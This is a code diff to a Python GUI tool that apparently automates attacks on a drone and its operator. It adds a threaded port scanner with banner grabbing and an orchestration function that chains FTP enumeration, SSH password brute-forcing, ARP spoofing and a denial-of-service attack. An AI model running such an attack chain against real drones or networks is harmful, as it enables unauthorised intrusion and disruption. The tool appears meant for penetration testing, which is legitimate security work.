@@ -785,7 +785,7 @@ def send_payload(command, seq_num):
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(formatted_payload.encode(), (ip_address, port))
             sock.close()
-            log("Payload sent successfully: " + formatted_payload)
+            print("Payload sent successfully: " + formatted_payload)
         
         except Exception as e:
             log("Error: " + str(e))
@@ -944,6 +944,58 @@ def arp():
 #****************************************************************************************
 #**************************************AutoIN********************************************
 #****************************************************************************************
+def scanports_automated(target_host):
+    open_ports = []
+
+    def scan_port(port):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(1)  # Adjust timeout as needed
+                result = s.connect_ex((target_host, port))
+                if result == 0:
+                    service = socket.getservbyport(port, "tcp")
+                    open_ports.append((port, service))
+                    try:
+                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_version:
+                            s_version.settimeout(1)  # Adjust timeout as needed
+                            s_version.connect((target_host, port))
+                            s_version.sendall(b"GET / HTTP/1.0\r\n\r\n")
+                            banner = s_version.recv(1024).decode("utf-8")
+                            print(f"Version: {banner.strip()}")
+                    except socket.error:
+                        pass
+        except socket.error:
+            pass
+
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = [executor.submit(scan_port, port) for port in range(1, 1001)]  # Scan common ports
+        for future in futures:
+            future.result()  # Wait for all tasks to complete
+    
+    return open_ports
+
+
+def execute_auto_test(ssh_user,ssh_passwordlist,operator_ip):
+    global result_text
+    global drone_ip
+    print("Executing automated test...")
+    print("Drone IP:", drone_ip)
+    # port scanning
+    result_text=scanports_automated(drone_ip)
+    print("Port scanning completed.")
+    print("result_text:", result_text)
+        # FTP enumeration
+    connect_and_list_files()
+
+        # SSH enumeration
+    start_brute_force(ssh_user,ssh_passwordlist)
+    open_ssh_connection(ssh_user)
+
+        # ARP spoofing and DoS attack
+    start_arp_spoof(operator_ip)
+    start_dos_attack(operator_ip)
+    print("Automated test completed.")
+
 def autoInputs():
     frame11.destroy()
     global frame19
@@ -968,31 +1020,12 @@ def autoInputs():
     operator_entry = customtkinter.CTkEntry(frame19)
     operator_entry.pack(padx=5 , pady=5)
     
-    attack = customtkinter.CTkButton(master=frame19, text="Start The Test", command=execute_auto_test)
+    attack = customtkinter.CTkButton(master=frame19, text="Start The Test", command=lambda: execute_auto_test(SSHuser_entry.get(),SSHpass_entry.get(),operator_entry.get()))
     attack.pack(padx=5, pady=30)
 
     NXTbutton = customtkinter.CTkButton(master=frame19, text="Next", command= lambda: [REP_GEN(), des19()])
     NXTbutton.pack(padx=10, pady=50)
 
-def execute_auto_test():
-    global result_text
-    global drone_ip
-    print("Executing automated test...")
-    print("Drone IP:", drone_ip)
-        # port scanning
-    scan_ports(drone_ip, result_text)
-    print("Port scanning completed.")
-    print("result_text:", result_text)
-        # FTP enumeration
-    connect_and_list_files()
-
-        # SSH enumeration
-    start_brute_force(SSHuser_entry.get(), SSHpass_entry.get())
-    open_ssh_connection(SSHuser_entry.get())
-
-        # ARP spoofing and DoS attack
-    start_arp_spoof(operator_entry.get())
-    start_dos_attack(operator_entry.get())
 
         
 
